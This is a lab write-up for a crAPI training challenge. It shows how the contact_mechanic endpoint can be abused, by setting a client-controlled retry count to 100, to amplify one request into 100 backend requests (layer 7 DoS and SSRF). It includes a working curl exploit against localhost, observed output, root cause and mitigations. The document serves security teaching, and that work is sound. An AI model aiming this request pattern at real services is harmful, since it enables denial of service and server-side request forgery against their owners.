# Challenge 6 — Rate Limiting / Layer 7 DoS via Contact Mechanic

**OWASP API Top 10 mapping:** API6:2023 Unrestricted Access to Sensitive Business Flows / API7:2023 Server Side Request Forgery  
**crAPI category:** Rate Limiting

## Goal

Use the contact mechanic feature to make crAPI perform an excessive number of outbound HTTP requests, demonstrating a layer 7 amplification / DoS condition.

## Vulnerability

The merchant-side contact mechanic endpoint accepts a URL (`mechanic_api`) and a client-controlled retry count (`number_of_repeats`). When `repeat_request_if_failed` is `true`, the server loops up to 100 times issuing `GET` requests to the supplied URL. There is no rate limiting on this single API call, so one authenticated request can be turned into 100 backend HTTP requests.

## Exploit steps

### 1. Authenticate as any user

```bash
JWT="<your-jwt>"
```

### 2. Ask the contact-mechanic endpoint to retry a non-200 URL 100 times

```bash
time curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/merchant/contact_mechanic \
  -d '{
    "mechanic_api": "http://127.0.0.1:8888/identity/api/auth/login",
    "repeat_request_if_failed": true,
    "number_of_repeats": 100
  }'
```

The target URL in this example returns `404`, but the server still performs 100 internal GET attempts before responding.

### 3. Observe the amplification

```json
{
  "response_from_mechanic_api": "\n<!doctype html>\n<html lang=\"en\">...Not Found...</html>\n",
  "status": 404
}
```

Timing output (observed in the lab):

```
real  0m1.322s
user  0m0.058s
sys   0m0.030s
```

The endpoint generated **100 outbound HTTP requests** from the crAPI backend in just over one second.

## Why this works

- `ContactMechanicView.post` trusts the client to supply both a URL and a retry count.
- The loop runs `while True` until it receives HTTP 200 or exhausts `number_of_repeats`.
- There is no rate limit, no allow-list of mechanic endpoints, and no cost control on retries.
- A slow or unreachable `mechanic_api` URL will block a worker thread for the duration of every connection attempt.

## Impact

- Single API call can be amplified into many backend or third-party requests.
- If the URL points to a slow external host, worker threads are consumed, causing legitimate requests to queue or fail.
- The same behavior is an **SSRF enabler**: an attacker can supply arbitrary internal or external URLs and have the server contact them repeatedly.

## Mitigation

- **Rate limit** the `/workshop/api/merchant/contact_mechanic` endpoint per user and per IP.
- **Do not let clients control retry counts** or target URLs directly. Use a predefined list of approved mechanic services.
- Cap the number of retries server-side (e.g., 3) and use exponential back-off with jitter.
- Place outbound requests in an async queue or worker pool so they cannot block synchronous API workers.
- Validate that the resolved URL does not point to internal infrastructure (SSRF defense).
